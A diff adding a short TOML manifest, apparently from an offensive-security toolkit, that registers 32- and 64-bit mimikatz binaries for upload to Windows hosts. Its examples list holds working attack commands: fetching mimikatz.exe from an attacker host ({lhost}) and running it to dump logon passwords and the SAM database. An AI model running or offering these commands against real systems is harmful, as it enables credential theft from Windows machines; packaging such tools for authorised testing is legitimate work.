@@ -1,0 +1,22 @@
+schema = 1
+kind = "upload"
+description = "Reads passwords, hashes and Kerberos tickets from Windows memory, and forges tickets"
+tags = ["windows", "credentials", "kerberos", "lsass"]
+upstream = "https://github.com/gentilkiwi/mimikatz"
+licence = "CC-BY-4.0"
+arch = "x86_64"
+examples = [
+  "iwr http://{lhost}/mimikatz.exe -OutFile mimikatz.exe",
+  ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+  ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"",
+]
+
+[[upload]]
+path = "files/x64/mimikatz.exe"
+as = "mimikatz.exe"
+note = "64-bit Windows"
+
+[[upload]]
+path = "files/Win32/mimikatz.exe"
+as = "mimikatz32.exe"
+note = "32-bit Windows"
